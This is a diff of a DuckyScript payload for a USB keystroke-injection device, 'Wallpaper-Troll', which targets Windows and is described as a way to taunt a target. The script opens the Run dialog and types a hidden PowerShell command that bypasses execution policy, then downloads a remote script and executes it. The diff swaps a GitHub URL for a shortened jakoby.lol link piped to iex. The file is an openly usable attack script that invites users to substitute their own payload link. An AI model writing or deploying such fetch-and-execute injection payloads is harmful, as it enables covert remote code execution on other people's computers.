@@ -2,11 +2,11 @@ REM     Title: Wallpaper-Troll
 REM
 REM     Author: I am Jakoby
 REM
-REM     Description: This payload is meant to taunt your target with a revealing wallpaper. See README.md for more details
+REM     Description: This payload is meant to taunt your target with a revealing wallpaper. See README.md for more details.
 REM
 REM     Target: Windows 10, 11
 REM
-REM     Remeber to replace the link with your link for the intended file to download if you are using a custom variant of this payload
+REM     Remeber to replace the link with your link for the intended file to download if you are using a custom variant of this payload.
 REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
 REM
 REM     --------------------------------------------------------------------------------------
@@ -15,6 +15,6 @@ REM     ------------------------------------------------------------------------
 REM
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-Wallpaper-Troll/Wallpaper-Troll.ps1?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Ep Bypass iwr jakoby.lol/b8n | iex
 DELAY 500
 ENTER
